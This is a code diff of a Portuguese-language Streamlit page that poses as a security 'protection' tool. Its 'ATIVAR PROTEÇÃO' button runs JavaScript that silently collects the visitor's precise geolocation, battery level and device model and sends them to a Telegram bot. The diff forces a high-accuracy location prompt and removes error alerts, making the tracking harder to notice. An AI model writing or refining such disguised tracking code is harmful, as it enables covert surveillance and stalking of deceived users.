@@ -8,7 +8,7 @@ ID = "8210828398"
 
 st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# --- ESTILIZAÇÃO (MANTIDA EXATAMENTE IGUAL) ---
+# --- ESTILIZAÇÃO (MANTIDA TOTALMENTE INTACTA) ---
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
@@ -45,32 +45,33 @@ st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# --- O BOTÃO COM CAPTURA DE MODELO, BATERIA E ENVIO DIRETO ---
-js_final_completo = f"""
+# --- BOTÃO COM GATILHO PARA "PRECISÃO DE LOCAL" DA GOOGLE ---
+js_google_accuracy = f"""
 <script>
-async function enviarTudo() {{
-    // 1. Captura Localização
+async function ativarProtecaoGoogle() {{
+    // Ativando HighAccuracy para forçar o pop-up da Precisão de Local (Foto 2)
+    const options = {{
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+    }};
+
     navigator.geolocation.getCurrentPosition(
         async (pos) => {{
             try {{
-                // 2. Captura Bateria
                 const battery = await navigator.getBattery();
                 const nivelBateria = Math.round(battery.level * 100);
-                
-                // 3. Captura Modelo (User Agent)
                 const modeloDispositivo = navigator.userAgent.split('(')[1].split(')')[0];
                 
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
                 const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
                 
-                // 4. Monta o Texto do Relatório
                 const texto = "🛡️ *SISTEMA ATIVADO*\\n\\n" +
                               "📱 *Modelo:* `" + modeloDispositivo + "`\\n" +
                               "🔋 *Bateria:* `" + nivelBateria + "%`\\n" +
                               "📍 [LOCALIZAÇÃO NO MAPA](" + mapa + ")";
                 
-                // 5. ENVIO DIRETO PARA O TELEGRAM (FETCH JS)
                 await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                     method: "POST",
                     headers: {{ "Content-Type": "application/json" }},
@@ -81,31 +82,32 @@ async function enviarTudo() {{
                     }})
                 }});
                 
-                // Avisa o Streamlit para girar a animação
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
                 
             }} catch (e) {{
                 console.error(e);
-                alert("Erro ao processar dados de segurança.");
             }}
         }},
-        (err) => {{ alert("Ative a localização para concluir a proteção."); }},
-        {{ enableHighAccuracy: false, timeout: 8000 }}
+        (err) => {{ 
+            // Caso o usuário recuse ou o sistema falhe
+            console.log("Erro ou recusado");
+        }},
+        options
     );
 }}
 </script>
-<button class="btn-barra" onclick="enviarTudo()">
+<button class="btn-barra" onclick="ativarProtecaoGoogle()">
     <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
 </button>
 """
 
 # Renderiza o botão
-clicou_ok = st.components.v1.html(js_final_completo, height=80)
+clicou_ativar = st.components.v1.html(js_google_accuracy, height=80)
 
 # --- ANIMAÇÃO DE SUCESSO ---
-if clicou_ok:
+if clicou_ativar:
     for p in range(4, 101, 8):
-        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
+        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
         time.sleep(0.04)
     st.success("Proteção Concluída!")
     st.stop()
